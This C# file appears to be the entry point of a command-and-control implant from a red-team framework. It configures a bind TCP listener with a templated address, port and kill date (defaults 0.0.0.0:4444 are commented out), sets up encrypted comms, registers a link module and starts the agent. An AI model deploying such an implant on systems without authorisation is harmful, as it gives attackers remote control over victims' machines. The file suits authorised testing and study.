using Agent.Modules;

using Agent.Controllers;
using Agent.Models;

using System;

namespace Agent
{
    public class Agent
    {
        public Agent()
        {
            Execute();
        }

        static void Main(string[] args)
        {
            new Agent();
        }

        public static void Execute()
        {
            var config = new ConfigController();
            //config.SetOption(ConfigSetting.BindAddress, "0.0.0.0");
            //config.SetOption(ConfigSetting.BindPort, 4444);
            //config.SetOption(ConfigSetting.KillDate, DateTime.Parse("01/01/2021 00:00:00"));

            config.SetOption(ConfigSetting.BindAddress, "<<BindAddress>>");
            config.SetOption(ConfigSetting.BindPort, "<<BindPort>>");
            config.SetOption(ConfigSetting.KillDate, DateTime.Parse("<<KillDate>>"));

            var crypto = new CryptoController();

            var commModule = new TcpCommModule();
            commModule.Init(config, crypto);

            var agent = new AgentController(config, crypto, commModule);
            agent.Init();
            agent.RegisterAgentModule(new LinkModule());
            agent.Start();
        }
    }
}